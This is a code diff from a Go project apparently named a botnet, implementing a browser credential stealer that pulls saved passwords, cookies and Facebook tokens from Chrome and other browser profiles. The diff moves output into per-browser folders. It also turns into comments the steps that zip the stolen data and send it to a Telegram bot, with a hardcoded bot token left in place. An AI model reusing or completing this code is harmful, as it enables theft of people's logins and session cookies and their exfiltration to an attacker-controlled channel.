@@ -4,10 +4,8 @@ import (
 	_const "botnetgolang/internal/const"
 	"botnetgolang/internal/model"
 	"botnetgolang/internal/pkg"
-	"encoding/json"
 	"fmt"
 	"io/ioutil"
-	"log"
 	"os"
 	"path/filepath"
 	"strings"
@@ -63,8 +61,15 @@ func FunGetProfile(browser model.BrowserPaths) *model.AllProfile {
 	return &result
 }
 
-func MainBL(browser model.BrowserPaths) {
+func MainBL(browser model.BrowserPaths, path string) {
 	allProfile := FunGetProfile(browser)
+
+	pathbrowser := path + `\` + browser.Name
+	err := os.Mkdir(pathbrowser, os.ModePerm)
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
 
 	if len(allProfile.Alls) < 0 {
 		return
@@ -183,78 +188,44 @@ func MainBL(browser model.BrowserPaths) {
 				fmt.Println(result)
 			}
 
-			pkg.GetToken(profile, cookie_ok_fb, cookie_ok, pass_model, allProfile.Version, browser)
+			pkg.GetToken(profile, cookie_ok_fb, cookie_ok, pass_model, allProfile.Version, browser, pathbrowser)
 		}
-
-		//path = fmt.Sprintf("%v\\Login Data", profile)
-		//connInfo, err := pkg.ConnectSQLite(path)
-		//info, _ := pkg.QueryData(connInfo, pkg.Passwords)
-
-		//// init condition to select
-		//conditions := []interface{}{
-		//	_const.Cfff,
-		//	_const.Cggg,
-		//	_const.Clll,
-		//}
-
-		//listInfo := info
-		//fmt.Println(listInfo)
-		//profiletmp := strings.Split(profile, "\\")
-		//for _, value := range listInfo {
-		//	infoRow := &model.Info{
-		//		Url:      value["action_url"].(string),
-		//		UserName: value["username_value"].(string),
-		//		Pass:     value["password_value"].(string),
-		//		Browser:  browser.Name,
-		//		Profile:  profiletmp[len(profiletmp)-1],
-		//	}
-		//	result := pkg.GetInfo(infoRow, allProfile.PathSource+browser.Local, masterKey)
-		//	if result != nil {
-		//		info_ok = append(info_ok, result)
-		//	}
-		//	fmt.Println(result)
-		//}
 
 	}
 
-	pkg.DeleteFolderRecursive("storage")
+	//pkg.SnapImage()
+	//file_cookie, err := os.Create(pathbrowser + `/` + "cookie.json")
+	//defer func() {
+	//	if err := file_cookie.Close(); err != nil {
+	//		panic(err)
+	//	}
+	//}()
+	//file_pass, err := os.Create("./storage/pass.json")
+	//defer func() {
+	//	if err := file_pass.Close(); err != nil {
+	//		panic(err)
+	//	}
+	//}()
 
-	err = os.Mkdir("storage", 0755)
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
-
-	pkg.SnapImage()
-
-	file_cookie, err := os.Create("./storage/cookie.json")
-	defer func() {
-		if err := file_cookie.Close(); err != nil {
-			panic(err)
-		}
-	}()
-	file_pass, err := os.Create("./storage/pass.json")
-	defer func() {
-		if err := file_pass.Close(); err != nil {
-			panic(err)
-		}
-	}()
-
-	encoder_cookie := json.NewEncoder(file_cookie)
-	err = encoder_cookie.Encode(cookie_ok)
-
-	encoder_pass := json.NewEncoder(file_pass)
-	err = encoder_pass.Encode(info_ok)
+	//encoder_cookie := json.NewEncoder(file_cookie)
+	//err = encoder_cookie.Encode(cookie_ok)
+	//
+	//encoder_pass := json.NewEncoder(file_pass)
+	//err = encoder_pass.Encode(info_ok)
 
 	pkg.GetInfoOperatingSystem()
 
-	err = pkg.ZipSource("storage", "storage.zip")
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	token := "6044700730:AAFR9FNJETE62Kmt1oSyNYuhKlwf1RhmOQE"
-	pkg.SendFileByBotTele(token, "storage.zip")
+	//token := "6044700730:AAFR9FNJETE62Kmt1oSyNYuhKlwf1RhmOQE"
+	//pkg.SendFileByBotTele(token, "storage.zip")
 	//fmt.Println(test)
+
+}
+
+func Run() {
+	MainBL(model.GetChromePaths(), "storage")
+	//MainBL(model.GetBravePaths(), "storage")
+	//MainBL(model.GetOperaGXPaths(), "storage")
+	//MainBL(model.GetOperaDefaultPaths(), "storage")
+	//MainBL(model.GetEdgePaths(), "storage")
 
 }
